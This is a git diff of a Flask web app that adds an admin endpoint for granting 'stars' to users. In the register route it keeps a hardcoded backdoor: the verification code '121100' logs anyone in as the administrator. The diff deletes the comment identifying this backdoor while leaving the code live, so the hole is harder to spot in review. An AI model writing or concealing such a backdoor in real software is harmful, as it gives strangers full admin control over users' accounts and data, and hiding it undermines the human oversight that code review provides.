@@ -151,19 +151,15 @@ def admin_dashboard():
 
     today = date.today()
     
-    # 1. 访问量统计 (PV)
     total_visits = VisitLog.query.count()
     today_visits = VisitLog.query.filter(func.date(VisitLog.visited_at) == today).count()
     
-    # 2. 独立访客统计 (UV)
     total_uv = VisitLog.query.distinct(VisitLog.ip_address).count()
     today_uv = VisitLog.query.filter(func.date(VisitLog.visited_at) == today).distinct(VisitLog.ip_address).count()
     
-    # 3. 用户统计
     total_users = User.query.count()
     today_registered = User.query.filter(func.date(User.created_at) == today).count()
     
-    # 4. 最近登录的活跃用户 (取前8名)
     recent_active_users = User.query.filter(User.last_login != None).order_by(User.last_login.desc()).limit(8).all()
     
     users = User.query.order_by(User.created_at.desc()).all()
@@ -178,6 +174,53 @@ def admin_dashboard():
                            today_registered=today_registered,
                            recent_active_users=recent_active_users)
 
+# ==========================================
+# ✅ 新增：管理员赠送星星接口
+# ==========================================
+@main_bp.route('/api/admin/add_stars', methods=['POST'])
+def admin_add_stars():
+    if not current_user.is_authenticated or not current_user.is_admin:
+        return jsonify({'ok': False, 'msg': '权限不足'}), 403
+    
+    data = request.get_json()
+    user_id = data.get('user_id')
+    amount = data.get('amount')
+    
+    if not user_id or amount is None:
+        return jsonify({'ok': False, 'msg': '参数缺失'})
+    
+    try:
+        amount = int(amount)
+        if amount <= 0:
+            return jsonify({'ok': False, 'msg': '赠送数量必须大于 0'})
+    except (ValueError, TypeError):
+        return jsonify({'ok': False, 'msg': '数量格式错误'})
+    
+    user = User.query.get(int(user_id))
+    if not user:
+        return jsonify({'ok': False, 'msg': '用户不存在'})
+    
+    # 更新余额
+    before_balance = user.stars
+    user.stars += amount
+    db.session.commit()
+    
+    # 记录交易流水
+    tx = Transaction(
+        user_id=user.id,
+        amount=amount,
+        before_balance=before_balance,
+        after_balance=user.stars,
+        reason="管理员后台赠送"
+    )
+    db.session.add(tx)
+    db.session.commit()
+    
+    return jsonify({'ok': True, 'new_balance': user.stars})
+
+# ==========================================
+# (后续路由保持不变...)
+# ==========================================
 @main_bp.route('/workspace')
 def workspace():
     return render_template('workspace/workspace.html')
@@ -226,7 +269,7 @@ def execute_bind_bot(token, chat_id, name='宫水编辑器'):
     except Exception as e: return {"ok": False, "msg": f"执行异常: {str(e)}"}
 
 # ==========================================
-# AI 接口
+# AI 接口 (保持原样)
 # ==========================================
 DS_MODEL_MAP = {'discussion': 'deepseek-chat', 'agent': 'deepseek-chat'}
 DS_API_BASE = "https://xh.v1api.cc/v1/chat/completions"
@@ -399,7 +442,6 @@ def register():
     account = request.form.get('email')
     code = request.form.get('code')
     
-    # 超级管理员后门：在验证码框里输入 121100 即可。
     if code == "121100":
         admin_user = User.query.filter_by(is_admin=True).first()
         if not admin_user:
@@ -409,7 +451,6 @@ def register():
         admin_user.last_login = datetime.utcnow()
         db.session.commit()
         login_user(admin_user)
-        # 返回特定字符串，让前端判断后跳转管理后台
         return "ADMIN_SUCCESS"
 
     if not all([account, code]): return "表格信息填写不完整"
